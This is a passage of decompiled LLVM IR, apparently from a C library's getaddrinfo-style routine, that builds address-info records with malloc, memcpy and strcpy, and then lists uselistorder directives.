  br i1 %v3_1001d1f8, label %dec_label_pc_1001d3dc, label %dec_label_pc_1001d200

dec_label_pc_1001d200:                            ; preds = %dec_label_pc_1001d1f4, %dec_label_pc_1001d1ec
  %v3_1001d200 = load i32, i32* %stack_var_-160, align 4
  %v3_1001d204 = icmp eq i32 %v3_1001d200, 0
  br i1 %v3_1001d204, label %dec_label_pc_1001d20c, label %dec_label_pc_1001d228

dec_label_pc_1001d20c:                            ; preds = %dec_label_pc_1001d200
  %v0_1001d20c = load i32, i32* @r28, align 4
  %v1_1001d20c = add i32 %v0_1001d20c, 4
  %v2_1001d20c = inttoptr i32 %v1_1001d20c to i32*
  %v3_1001d20c = load i32, i32* %v2_1001d20c, align 4
  %v0_1001d210 = load i32, i32* @r26, align 4
  store i32 %v0_1001d210, i32* %r4.global-to-local, align 4
  store i32 268554784, i32* @lr, align 4
  %v4_1001d21c = call i32 @__GI_inet_ntop(i32 %v3_1001d20c, i32 %v0_1001d210, i32 %v2_1001d214, i32 46)
  br label %dec_label_pc_1001d22c

dec_label_pc_1001d228:                            ; preds = %dec_label_pc_1001d200
  %v1_1001d228 = inttoptr i32 %v3_1001d200 to i32*
  %v2_1001d228 = load i32, i32* %v1_1001d228, align 4
  br label %dec_label_pc_1001d22c

dec_label_pc_1001d22c:                            ; preds = %dec_label_pc_1001d20c, %dec_label_pc_1001d228
  %v0_1001d234 = phi i32 [ %v4_1001d21c, %dec_label_pc_1001d20c ], [ %v2_1001d228, %dec_label_pc_1001d228 ]
  store i32 %v0_1001d234, i32* @r26, align 4
  %v3_1001d22c = icmp eq i32 %v0_1001d234, 0
  br i1 %v3_1001d22c, label %dec_label_pc_1001d3cc, label %dec_label_pc_1001d234

dec_label_pc_1001d234:                            ; preds = %dec_label_pc_1001d22c
  store i32 %v0_1001d234, i32* @r3, align 4
  %v0_1001d238 = call i32 @__GI_strlen()
  %v1_1001d23c = add i32 %v0_1001d238, 1
  store i32 %v1_1001d23c, i32* %r22.global-to-local, align 4
  %v0_1001d240.pre = load i32, i32* @r28, align 4
  br label %dec_label_pc_1001d240

dec_label_pc_1001d240:                            ; preds = %dec_label_pc_1001d15c, %dec_label_pc_1001d234
  %v0_1001d27059 = phi i32 [ 0, %dec_label_pc_1001d15c ], [ %v1_1001d23c, %dec_label_pc_1001d234 ]
  %v0_1001d240 = phi i32 [ %v0_1001d18454, %dec_label_pc_1001d15c ], [ %v0_1001d240.pre, %dec_label_pc_1001d234 ]
  %v1_1001d240 = add i32 %v0_1001d240, 4
  %v2_1001d240 = inttoptr i32 %v1_1001d240 to i32*
  %v3_1001d240 = load i32, i32* %v2_1001d240, align 4
  store i32 %v3_1001d240, i32* %r0.global-to-local, align 4
  %v3_1001d244 = icmp eq i32 %v3_1001d240, 10
  br i1 %v3_1001d244, label %dec_label_pc_1001d25c, label %dec_label_pc_1001d24c

dec_label_pc_1001d24c:                            ; preds = %dec_label_pc_1001d240
  %v0_1001d24c = load i32, i32* @r21, align 4
  %v3_1001d24c = icmp eq i32 %v0_1001d24c, 0
  store i32 16, i32* %r23.global-to-local, align 4
  store i32 2, i32* %r24.global-to-local, align 4
  br i1 %v3_1001d24c, label %dec_label_pc_1001d264, label %dec_label_pc_1001d25c

dec_label_pc_1001d25c:                            ; preds = %dec_label_pc_1001d24c, %dec_label_pc_1001d240
  store i32 28, i32* %r23.global-to-local, align 4
  store i32 10, i32* %r24.global-to-local, align 4
  br label %dec_label_pc_1001d264

dec_label_pc_1001d264:                            ; preds = %dec_label_pc_1001d24c, %dec_label_pc_1001d25c
  %v0_1001d26c57 = phi i32 [ 16, %dec_label_pc_1001d24c ], [ 28, %dec_label_pc_1001d25c ]
  %v3_1001d264 = load i32, i32* %stack_var_-168, align 4
  store i32 %v3_1001d264, i32* @r30, align 4
  %v3_1001d3a411 = icmp eq i32 %v3_1001d264, 0
  br i1 %v3_1001d3a411, label %dec_label_pc_1001d3ac, label %dec_label_pc_1001d26c.preheader

dec_label_pc_1001d26c.preheader:                  ; preds = %dec_label_pc_1001d264
  %v1_1001d26c88 = add i32 %v0_1001d27059, 32
  %v2_1001d27089 = add i32 %v1_1001d26c88, %v0_1001d26c57
  store i32 %v2_1001d27089, i32* @r3, align 4
  store i32 268554872, i32* @lr, align 4
  %v0_1001d27490 = call i32 @malloc()
  %v3_1001d27893 = icmp eq i32 %v0_1001d27490, 0
  %v1_1001d27c94 = load i32, i32* @r25, align 4
  %v2_1001d27c95 = inttoptr i32 %v1_1001d27c94 to i32*
  store i32 %v0_1001d27490, i32* %v2_1001d27c95, align 4
  br i1 %v3_1001d27893, label %dec_label_pc_1001d3ec, label %dec_label_pc_1001d284

dec_label_pc_1001d284:                            ; preds = %dec_label_pc_1001d26c.preheader, %dec_label_pc_1001d38c.dec_label_pc_1001d26c_crit_edge
  %v0_1001d27496 = phi i32 [ %v0_1001d274, %dec_label_pc_1001d38c.dec_label_pc_1001d26c_crit_edge ], [ %v0_1001d27490, %dec_label_pc_1001d26c.preheader ]
  %v0_1001d284 = load i32, i32* @r27, align 4
  %v1_1001d284 = inttoptr i32 %v0_1001d284 to i32*
  %v2_1001d284 = load i32, i32* %v1_1001d284, align 4
  store i32 %v2_1001d284, i32* %r0.global-to-local, align 4
  %v0_1001d288 = load i32, i32* %r24.global-to-local, align 4
  %v3_1001d288 = icmp eq i32 %v0_1001d288, 10
  %v2_1001d28c = inttoptr i32 %v0_1001d27496 to i32*
  store i32 %v2_1001d284, i32* %v2_1001d28c, align 4
  %v0_1001d290 = load i32, i32* @r25, align 4
  %v1_1001d290 = inttoptr i32 %v0_1001d290 to i32*
  %v2_1001d290 = load i32, i32* %v1_1001d290, align 4
  store i32 %v2_1001d290, i32* %r9.global-to-local, align 4
  %v0_1001d294 = load i32, i32* %r24.global-to-local, align 4
  %v2_1001d294 = add i32 %v2_1001d290, 4
  %v3_1001d294 = inttoptr i32 %v2_1001d294 to i32*
  store i32 %v0_1001d294, i32* %v3_1001d294, align 4
  %v0_1001d298 = load i32, i32* @r25, align 4
  %v1_1001d298 = inttoptr i32 %v0_1001d298 to i32*
  %v2_1001d298 = load i32, i32* %v1_1001d298, align 4
  store i32 %v2_1001d298, i32* %r9.global-to-local, align 4
  %v0_1001d29c = load i32, i32* @r30, align 4
  %v1_1001d29c = add i32 %v0_1001d29c, 4
  %v2_1001d29c = inttoptr i32 %v1_1001d29c to i32*
  %v3_1001d29c = load i32, i32* %v2_1001d29c, align 4
  store i32 %v3_1001d29c, i32* %r0.global-to-local, align 4
  %v2_1001d2a0 = add i32 %v2_1001d298, 8
  %v3_1001d2a0 = inttoptr i32 %v2_1001d2a0 to i32*
  store i32 %v3_1001d29c, i32* %v3_1001d2a0, align 4
  %v0_1001d2a4 = load i32, i32* @r25, align 4
  %v1_1001d2a4 = inttoptr i32 %v0_1001d2a4 to i32*
  %v2_1001d2a4 = load i32, i32* %v1_1001d2a4, align 4
  store i32 %v2_1001d2a4, i32* %r9.global-to-local, align 4
  %v0_1001d2a8 = load i32, i32* @r30, align 4
  %v1_1001d2a8 = add i32 %v0_1001d2a8, 8
  %v2_1001d2a8 = inttoptr i32 %v1_1001d2a8 to i32*
  %v3_1001d2a8 = load i32, i32* %v2_1001d2a8, align 4
  store i32 %v3_1001d2a8, i32* %r0.global-to-local, align 4
  %v2_1001d2ac = add i32 %v2_1001d2a4, 12
  %v3_1001d2ac = inttoptr i32 %v2_1001d2ac to i32*
  store i32 %v3_1001d2a8, i32* %v3_1001d2ac, align 4
  %v0_1001d2b0 = load i32, i32* @r25, align 4
  %v1_1001d2b0 = inttoptr i32 %v0_1001d2b0 to i32*
  %v2_1001d2b0 = load i32, i32* %v1_1001d2b0, align 4
  store i32 %v2_1001d2b0, i32* %r9.global-to-local, align 4
  %v0_1001d2b4 = load i32, i32* %r23.global-to-local, align 4
  %v2_1001d2b4 = add i32 %v2_1001d2b0, 16
  %v3_1001d2b4 = inttoptr i32 %v2_1001d2b4 to i32*
  store i32 %v0_1001d2b4, i32* %v3_1001d2b4, align 4
  %v0_1001d2b8 = load i32, i32* @r25, align 4
  %v1_1001d2b8 = inttoptr i32 %v0_1001d2b8 to i32*
  %v2_1001d2b8 = load i32, i32* %v1_1001d2b8, align 4
  store i32 %v2_1001d2b8, i32* %r9.global-to-local, align 4
  %v1_1001d2bc = add i32 %v2_1001d2b8, 32
  store i32 %v1_1001d2bc, i32* %r0.global-to-local, align 4
  %v2_1001d2c0 = add i32 %v2_1001d2b8, 20
  %v3_1001d2c0 = inttoptr i32 %v2_1001d2c0 to i32*
  store i32 %v1_1001d2bc, i32* %v3_1001d2c0, align 4
  %v0_1001d2c4 = load i32, i32* @r25, align 4
  %v1_1001d2c4 = inttoptr i32 %v0_1001d2c4 to i32*
  %v2_1001d2c4 = load i32, i32* %v1_1001d2c4, align 4
  store i32 %v2_1001d2c4, i32* %r9.global-to-local, align 4
  %v1_1001d2c8 = add i32 %v2_1001d2c4, 20
  %v2_1001d2c8 = inttoptr i32 %v1_1001d2c8 to i32*
  %v3_1001d2c8 = load i32, i32* %v2_1001d2c8, align 4
  store i32 %v3_1001d2c8, i32* %r9.global-to-local, align 4
  %v0_1001d2cc = load i32, i32* %r24.global-to-local, align 4
  %v1_1001d2cc = trunc i32 %v0_1001d2cc to i16
  %v3_1001d2cc = inttoptr i32 %v3_1001d2c8 to i16*
  store i16 %v1_1001d2cc, i16* %v3_1001d2cc, align 2
  %v0_1001d2d0 = load i32, i32* @r25, align 4
  %v1_1001d2d0 = inttoptr i32 %v0_1001d2d0 to i32*
  %v2_1001d2d0 = load i32, i32* %v1_1001d2d0, align 4
  %v1_1001d2d8 = add i32 %v2_1001d2d0, 20
  %v2_1001d2d8 = inttoptr i32 %v1_1001d2d8 to i32*
  %v3_1001d2d8 = load i32, i32* %v2_1001d2d8, align 4
  store i32 %v3_1001d2d8, i32* %r29.global-to-local, align 4
  br i1 %v3_1001d288, label %dec_label_pc_1001d2d8, label %dec_label_pc_1001d330

dec_label_pc_1001d2d8:                            ; preds = %dec_label_pc_1001d284
  store i32 0, i32* %r9.global-to-local, align 4
  %v0_1001d2e0 = load i32, i32* @r28, align 4
  %v1_1001d2e0 = add i32 %v0_1001d2e0, 8
  store i32 %v1_1001d2e0, i32* @r4, align 4
  store i32 16, i32* @r5, align 4
  %v2_1001d2e8 = add i32 %v3_1001d2d8, 4
  %v3_1001d2e8 = inttoptr i32 %v2_1001d2e8 to i32*
  store i32 0, i32* %v3_1001d2e8, align 4
  %v0_1001d2ec = load i32, i32* %r29.global-to-local, align 4
  %v1_1001d2ec = add i32 %v0_1001d2ec, 8
  store i32 %v1_1001d2ec, i32* @r3, align 4
  %v0_1001d2f0 = load i32, i32* @r28, align 4
  %v1_1001d2f0 = add i32 %v0_1001d2f0, 4
  %v2_1001d2f0 = inttoptr i32 %v1_1001d2f0 to i32*
  %v3_1001d2f0 = load i32, i32* %v2_1001d2f0, align 4
  store i32 %v3_1001d2f0, i32* %r0.global-to-local, align 4
  %v3_1001d2f4 = icmp eq i32 %v3_1001d2f0, 10
  br i1 %v3_1001d2f4, label %dec_label_pc_1001d318, label %dec_label_pc_1001d2fc

dec_label_pc_1001d2fc:                            ; preds = %dec_label_pc_1001d2d8
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_1001d300 = load i32, i32* %r9.global-to-local, align 4
  %v2_1001d300 = add i32 %v0_1001d2ec, 12
  %v3_1001d300 = inttoptr i32 %v2_1001d300 to i32*
  store i32 %v0_1001d300, i32* %v3_1001d300, align 4
  %v0_1001d304 = load i32, i32* %r0.global-to-local, align 4
  %v1_1001d304 = or i32 %v0_1001d304, 65535
  store i32 %v1_1001d304, i32* %r0.global-to-local, align 4
  %v0_1001d308 = load i32, i32* %r9.global-to-local, align 4
  %v1_1001d308 = load i32, i32* %r29.global-to-local, align 4
  %v2_1001d308 = add i32 %v1_1001d308, 8
  %v3_1001d308 = inttoptr i32 %v2_1001d308 to i32*
  store i32 %v0_1001d308, i32* %v3_1001d308, align 4
  %v0_1001d30c = load i32, i32* %r0.global-to-local, align 4
  %v1_1001d30c = load i32, i32* %r29.global-to-local, align 4
  %v2_1001d30c = add i32 %v1_1001d30c, 16
  %v3_1001d30c = inttoptr i32 %v2_1001d30c to i32*
  store i32 %v0_1001d30c, i32* %v3_1001d30c, align 4
  %v0_1001d310 = load i32, i32* %r29.global-to-local, align 4
  %v1_1001d310 = add i32 %v0_1001d310, 20
  store i32 %v1_1001d310, i32* @r3, align 4
  store i32 4, i32* @r5, align 4
  br label %dec_label_pc_1001d318

dec_label_pc_1001d318:                            ; preds = %dec_label_pc_1001d2d8, %dec_label_pc_1001d2fc
  store i32 268555036, i32* @lr, align 4
  %v0_1001d318 = call i32 @memcpy()
  %v0_1001d31c = load i32, i32* @r30, align 4
  %v1_1001d31c = add i32 %v0_1001d31c, 12
  %v2_1001d31c = inttoptr i32 %v1_1001d31c to i32*
  %v3_1001d31c = load i32, i32* %v2_1001d31c, align 4
  store i32 %v3_1001d31c, i32* %r0.global-to-local, align 4
  %v1_1001d320 = trunc i32 %v3_1001d31c to i16
  %v2_1001d320 = load i32, i32* %r29.global-to-local, align 4
  %v3_1001d320 = add i32 %v2_1001d320, 2
  %v4_1001d320 = inttoptr i32 %v3_1001d320 to i16*
  store i16 %v1_1001d320, i16* %v4_1001d320, align 2
  %v0_1001d324 = load i32, i32* @r28, align 4
  %v1_1001d324 = add i32 %v0_1001d324, 24
  %v2_1001d324 = inttoptr i32 %v1_1001d324 to i32*
  %v3_1001d324 = load i32, i32* %v2_1001d324, align 4
  store i32 %v3_1001d324, i32* %r0.global-to-local, align 4
  %v1_1001d328 = load i32, i32* %r29.global-to-local, align 4
  %v2_1001d328 = add i32 %v1_1001d328, 24
  %v3_1001d328 = inttoptr i32 %v2_1001d328 to i32*
  store i32 %v3_1001d324, i32* %v3_1001d328, align 4
  br label %dec_label_pc_1001d35c

dec_label_pc_1001d330:                            ; preds = %dec_label_pc_1001d284
  %v0_1001d334 = load i32, i32* @r28, align 4
  %v1_1001d334 = add i32 %v0_1001d334, 8
  store i32 %v1_1001d334, i32* @r4, align 4
  store i32 4, i32* @r5, align 4
  %v1_1001d33c = add i32 %v3_1001d2d8, 4
  store i32 %v1_1001d33c, i32* @r3, align 4
  store i32 268555076, i32* @lr, align 4
  %v0_1001d340 = call i32 @memcpy()
  %v0_1001d344 = load i32, i32* @r30, align 4
  %v1_1001d344 = add i32 %v0_1001d344, 12
  %v2_1001d344 = inttoptr i32 %v1_1001d344 to i32*
  %v3_1001d344 = load i32, i32* %v2_1001d344, align 4
  store i32 %v3_1001d344, i32* %r0.global-to-local, align 4
  %v0_1001d348 = load i32, i32* %r29.global-to-local, align 4
  %v1_1001d348 = add i32 %v0_1001d348, 8
  store i32 %v1_1001d348, i32* @r3, align 4
  store i32 0, i32* @r4, align 4
  %v1_1001d350 = trunc i32 %v3_1001d344 to i16
  %v3_1001d350 = add i32 %v0_1001d348, 2
  %v4_1001d350 = inttoptr i32 %v3_1001d350 to i16*
  store i16 %v1_1001d350, i16* %v4_1001d350, align 2
  store i32 8, i32* @r5, align 4
  store i32 268555100, i32* @lr, align 4
  %v0_1001d358 = call i32 @__GI_memset()
  br label %dec_label_pc_1001d35c

dec_label_pc_1001d35c:                            ; preds = %dec_label_pc_1001d318, %dec_label_pc_1001d330
  %v0_1001d35c = load i32, i32* @r26, align 4
  %v3_1001d35c = icmp eq i32 %v0_1001d35c, 0
  %v0_1001d360 = load i32, i32* @r25, align 4
  %v1_1001d360 = inttoptr i32 %v0_1001d360 to i32*
  %v2_1001d360 = load i32, i32* %v1_1001d360, align 4
  br i1 %v3_1001d35c, label %dec_label_pc_1001d388, label %dec_label_pc_1001d368

dec_label_pc_1001d368:                            ; preds = %dec_label_pc_1001d35c
  %v1_1001d368 = load i32, i32* %r23.global-to-local, align 4
  store i32 %v0_1001d35c, i32* %r4.global-to-local, align 4
  %v2_1001d368 = add i32 %v2_1001d360, 32
  %v1_1001d370 = add i32 %v2_1001d368, %v1_1001d368
  store i32 %v1_1001d370, i32* %r9.global-to-local, align 4
  %v2_1001d374 = add i32 %v2_1001d360, 24
  %v3_1001d374 = inttoptr i32 %v2_1001d374 to i32*
  store i32 %v1_1001d370, i32* %v3_1001d374, align 4
  %v0_1001d378 = load i32, i32* @r25, align 4
  %v1_1001d378 = inttoptr i32 %v0_1001d378 to i32*
  %v2_1001d378 = load i32, i32* %v1_1001d378, align 4
  store i32 %v2_1001d378, i32* %r9.global-to-local, align 4
  %v1_1001d37c = add i32 %v2_1001d378, 24
  %v2_1001d37c = inttoptr i32 %v1_1001d37c to i32*
  %v3_1001d37c = load i32, i32* %v2_1001d37c, align 4
  %v2_1001d380 = inttoptr i32 %v0_1001d35c to i8*
  %v3_1001d380 = call i32 @strcpy(i32 %v3_1001d37c, i8* %v2_1001d380)
  br label %dec_label_pc_1001d38c

dec_label_pc_1001d388:                            ; preds = %dec_label_pc_1001d35c
  %v2_1001d388 = add i32 %v2_1001d360, 24
  %v3_1001d388 = inttoptr i32 %v2_1001d388 to i32*
  store i32 0, i32* %v3_1001d388, align 4
  br label %dec_label_pc_1001d38c

dec_label_pc_1001d38c:                            ; preds = %dec_label_pc_1001d368, %dec_label_pc_1001d388
  %v0_1001d38c = load i32, i32* @r25, align 4
  %v1_1001d38c = inttoptr i32 %v0_1001d38c to i32*
  %v2_1001d38c = load i32, i32* %v1_1001d38c, align 4
  store i32 %v2_1001d38c, i32* %r9.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_1001d394 = add i32 %v2_1001d38c, 28
  %v3_1001d394 = inttoptr i32 %v2_1001d394 to i32*
  store i32 0, i32* %v3_1001d394, align 4
  %v0_1001d398 = load i32, i32* @r25, align 4
  %v1_1001d398 = inttoptr i32 %v0_1001d398 to i32*
  %v2_1001d398 = load i32, i32* %v1_1001d398, align 4
  store i32 %v2_1001d398, i32* %r9.global-to-local, align 4
  %v0_1001d39c = load i32, i32* @r30, align 4
  %v1_1001d39c = inttoptr i32 %v0_1001d39c to i32*
  %v2_1001d39c = load i32, i32* %v1_1001d39c, align 4
  store i32 %v2_1001d39c, i32* @r30, align 4
  %v1_1001d3a0 = add i32 %v2_1001d398, 28
  store i32 %v1_1001d3a0, i32* @r25, align 4
  %v3_1001d3a4 = icmp eq i32 %v2_1001d39c, 0
  br i1 %v3_1001d3a4, label %dec_label_pc_1001d3a4.dec_label_pc_1001d3ac_crit_edge, label %dec_label_pc_1001d38c.dec_label_pc_1001d26c_crit_edge

dec_label_pc_1001d38c.dec_label_pc_1001d26c_crit_edge: ; preds = %dec_label_pc_1001d38c
  %v0_1001d26c.pre = load i32, i32* %r23.global-to-local, align 4
  %v0_1001d270.pre = load i32, i32* %r22.global-to-local, align 4
  %v1_1001d26c = add i32 %v0_1001d270.pre, 32
  %v2_1001d270 = add i32 %v1_1001d26c, %v0_1001d26c.pre
  store i32 %v2_1001d270, i32* @r3, align 4
  store i32 268554872, i32* @lr, align 4
  %v0_1001d274 = call i32 @malloc()
  %v3_1001d278 = icmp eq i32 %v0_1001d274, 0
  %v1_1001d27c = load i32, i32* @r25, align 4
  %v2_1001d27c = inttoptr i32 %v1_1001d27c to i32*
  store i32 %v0_1001d274, i32* %v2_1001d27c, align 4
  br i1 %v3_1001d278, label %dec_label_pc_1001d3ec, label %dec_label_pc_1001d284

dec_label_pc_1001d3a4.dec_label_pc_1001d3ac_crit_edge: ; preds = %dec_label_pc_1001d38c
  %v0_1001d3ac.pre = load i32, i32* @r28, align 4
  br label %dec_label_pc_1001d3ac

dec_label_pc_1001d3ac:                            ; preds = %dec_label_pc_1001d3a4.dec_label_pc_1001d3ac_crit_edge, %dec_label_pc_1001d264
  %v0_1001d3ac = phi i32 [ %v0_1001d3ac.pre, %dec_label_pc_1001d3a4.dec_label_pc_1001d3ac_crit_edge ], [ %v0_1001d240, %dec_label_pc_1001d264 ]
  %v1_1001d3ac = inttoptr i32 %v0_1001d3ac to i32*
  %v2_1001d3ac = load i32, i32* %v1_1001d3ac, align 4
  store i32 %v2_1001d3ac, i32* @r28, align 4
  %v3_1001d3b0 = icmp eq i32 %v2_1001d3ac, 0
  br i1 %v3_1001d3b0, label %dec_label_pc_1001d3f4, label %dec_label_pc_1001d15c

dec_label_pc_1001d3bc:                            ; preds = %dec_label_pc_1001ca90, %dec_label_pc_1001c974, %dec_label_pc_1001c998
  store i32 264, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1001d3f8

dec_label_pc_1001d3c4:                            ; preds = %dec_label_pc_1001ccb8, %dec_label_pc_1001cc20
  store i32 6, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1001d3f8

dec_label_pc_1001d3cc:                            ; preds = %dec_label_pc_1001d22c, %dec_label_pc_1001d058, %dec_label_pc_1001cd24
  store i32 258, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1001d3f8

dec_label_pc_1001d3d4:                            ; preds = %dec_label_pc_1001d048, %dec_label_pc_1001d040
  store i32 259, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1001d3f8

dec_label_pc_1001d3dc:                            ; preds = %dec_label_pc_1001d1f4
  %v0_1001d3dc = call i32 @__GI___h_errno_location()
  store i32 11, i32* %r9.global-to-local, align 4
  %v0_1001d3e4 = load i32, i32* @r30, align 4
  %v2_1001d3e4 = inttoptr i32 %v0_1001d3dc to i32*
  store i32 %v0_1001d3e4, i32* %v2_1001d3e4, align 4
  br label %dec_label_pc_1001d3f8

dec_label_pc_1001d3ec:                            ; preds = %dec_label_pc_1001d38c.dec_label_pc_1001d26c_crit_edge, %dec_label_pc_1001d26c.preheader
  store i32 10, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1001d3f8

dec_label_pc_1001d3f4:                            ; preds = %dec_label_pc_1001d3ac, %dec_label_pc_1001d150, %dec_label_pc_1001d148
  store i32 0, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1001d3f8

dec_label_pc_1001d3f8:                            ; preds = %dec_label_pc_1001ca6c, %dec_label_pc_1001c9c4, %dec_label_pc_1001c974, %dec_label_pc_1001d048, %dec_label_pc_1001d3ec, %dec_label_pc_1001d3dc, %dec_label_pc_1001d3d4, %dec_label_pc_1001d3cc, %dec_label_pc_1001d3c4, %dec_label_pc_1001d3bc, %dec_label_pc_1001cf6c, %dec_label_pc_1001d3f4
  %v2_1001d3f8 = load i32, i32* %stack_var_-208, align 4
  store i32 %v2_1001d3f8, i32* %r11.global-to-local, align 4
  %v0_1001d3fc = load i32, i32* %r9.global-to-local, align 4
  %v1_1001d400 = add i32 %v2_1001d3f8, 4
  %v2_1001d400 = inttoptr i32 %v1_1001d400 to i32*
  %v3_1001d400 = load i32, i32* %v2_1001d400, align 4
  store i32 %v3_1001d400, i32* %r0.global-to-local, align 4
  ret i32 %v0_1001d3fc

; uselistorder directives
  uselistorder i32 %v2_1001d3ac, { 1, 2, 0 }
  uselistorder i32 %v0_1001d274, { 1, 2, 0 }
  uselistorder i32 %v2_1001d360, { 2, 1, 0 }
  uselistorder i32 %v0_1001d35c, { 1, 0, 2 }
  uselistorder i32 %v1_1001d178, { 1, 0 }
  uselistorder i32 %v1_1001d134, { 1, 0 }
  uselistorder i32 %v1_1001d0ec, { 1, 0 }
  uselistorder i32 %v1_1001d00c, { 1, 0 }
  uselistorder i32 %v0_1001d00c, { 1, 0 }
  uselistorder i32 %v0_1001cf88, { 0, 1, 3, 2 }
  uselistorder i32 %v1_1001cf04, { 1, 0 }
  uselistorder i32 %v0_1001d02c, { 0, 2, 1, 3 }
  uselistorder i32 %v1_1001cea4, { 1, 0 }
  uselistorder i32 %v0_1001cea4, { 1, 0 }
  uselistorder i32 %v0_1001ce44, { 1, 0 }
  uselistorder i32 %v0_1001ce10, { 0, 2, 1 }
  uselistorder i32 %v1_1001cd90, { 1, 0 }
  uselistorder i32 %v0_1001cbb4, { 1, 0 }
  uselistorder i32 %v1_1001cb98, { 3, 2, 0, 1, 4, 5, 6 }
  uselistorder i32 %v0_1001cb84, { 0, 2, 1 }
  uselistorder i32 %v1_1001ca80, { 1, 0 }
  uselistorder i32 %v1_1001ca58, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_1001cb68, { 2, 1, 3, 4, 0, 6, 5, 7 }
  uselistorder i32 %v3_1001c974, { 0, 1, 4, 3, 2 }
  uselistorder i32 %v0_1001c91c, { 0, 2, 3, 4, 5, 6, 1 }
  uselistorder i1 %v3_1001c8f8, { 1, 0, 2 }
  uselistorder i32 %v2_1001c8a4, { 1, 0, 2, 3, 4 }
  uselistorder i32* %stack_var_-176, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32* %stack_var_-168, { 0, 11, 1, 2, 3, 4, 5, 6, 7, 8, 9, 12, 10 }
  uselistorder i32* %stack_var_-185, { 0, 1, 2, 4, 3 }
  uselistorder i32* %stack_var_-256, { 0, 2, 3, 4, 1 }
  uselistorder i8** %stack_var_-156, { 12, 11, 5, 0, 10, 9, 4, 1, 8, 7, 3, 6, 2 }
  uselistorder i32* %stack_var_-164, { 0, 1, 2, 3, 4, 5, 6, 7, 20, 21, 22, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19 }
  uselistorder i32* %stack_var_-160, { 2, 3, 6, 0, 4, 7, 1, 5, 8 }
  uselistorder i32* %r9.global-to-local, { 81, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 37, 38, 32, 33, 34, 35, 36, 39, 40, 41, 42, 48, 49, 43, 44, 45, 46, 47, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 82, 83, 84, 85, 86 }
  uselistorder i32* %r30.global-to-local, { 1, 2, 0, 3, 5, 4, 6, 7, 9, 8, 10, 11, 12, 13, 14, 15, 16, 17, 18 }
  uselistorder i32* %r29.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 13, 11, 12, 14, 15, 16, 17, 18 }
  uselistorder i32* %r24.global-to-local, { 1, 2, 3, 0, 4 }
  uselistorder i32* %r23.global-to-local, { 3, 1, 2, 4, 0 }
  uselistorder i32* %r22.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 10, 11, 9, 12, 13, 14, 15, 16, 17, 18, 19, 20, 22, 21, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 53, 114, 39, 36, 37, 38, 40, 41, 42, 43, 44, 45, 46, 47, 51, 48, 49, 50, 52, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 80, 77, 78, 79, 0, 86, 82, 81, 83, 84, 85, 88, 87, 89, 90, 91, 99, 92, 93, 94, 95, 96, 97, 98, 100, 101, 102, 1, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113 }
  uselistorder i32 264, { 1, 0, 2 }
  uselistorder i32 268554872, { 1, 0 }
  uselistorder i32 -25, { 1, 0, 2, 3, 4, 5, 6, 7, 8 }
  uselistorder i32 (i32)* @gethostbyname2_r, { 1, 0 }
  uselistorder i8 -1, { 1, 2, 3, 4, 5, 0, 6, 7, 8, 9, 10, 11, 12, 13 }
  uselistorder i32 37, { 1, 2, 3, 4, 0 }
  uselistorder i32 (i32)* @gaih_inet_serv, { 1, 0 }
  uselistorder i32 %arg3, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1001d3f8, { 11, 4, 5, 6, 7, 8, 9, 3, 10, 0, 1, 2 }
  uselistorder label %dec_label_pc_1001d3bc, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1001d38c, { 1, 0 }
  uselistorder label %dec_label_pc_1001d35c, { 1, 0 }
  uselistorder label %dec_label_pc_1001d318, { 1, 0 }
  uselistorder label %dec_label_pc_1001d284, { 1, 0 }
  uselistorder label %dec_label_pc_1001d264, { 1, 0 }
  uselistorder label %dec_label_pc_1001d240, { 1, 0 }
  uselistorder label %dec_label_pc_1001d22c, { 1, 0 }
  uselistorder label %dec_label_pc_1001d1ec, { 1, 0 }
  uselistorder label %dec_label_pc_1001d15c, { 1, 0 }
  uselistorder label %dec_label_pc_1001d148, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_1001d114, { 1, 0 }
  uselistorder label %dec_label_pc_1001d10c, { 1, 0 }
  uselistorder label %dec_label_pc_1001d0c8, { 1, 0 }
  uselistorder label %dec_label_pc_1001d058, { 5, 6, 1, 0, 2, 3, 4 }
  uselistorder label %dec_label_pc_1001d048, { 1, 0 }
  uselistorder label %dec_label_pc_1001d008, { 1, 0 }
  uselistorder label %dec_label_pc_1001cfd4, { 1, 0 }
  uselistorder label %dec_label_pc_1001cf60, { 1, 0 }
  uselistorder label %dec_label_pc_1001cec4, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_1001cea0, { 1, 0 }
  uselistorder label %dec_label_pc_1001ce6c, { 1, 0 }
  uselistorder label %dec_label_pc_1001cdec, { 1, 0 }
  uselistorder label %dec_label_pc_1001cd4c, { 0, 1, 3, 4, 2 }
  uselistorder label %dec_label_pc_1001cc90, { 1, 0 }
  uselistorder label %dec_label_pc_1001cc34, { 1, 0 }
  uselistorder label %dec_label_pc_1001cbc0, { 0, 1, 4, 2, 3 }
  uselistorder label %dec_label_pc_1001cb78, { 1, 0 }
  uselistorder label %dec_label_pc_1001cb5c, { 1, 0 }
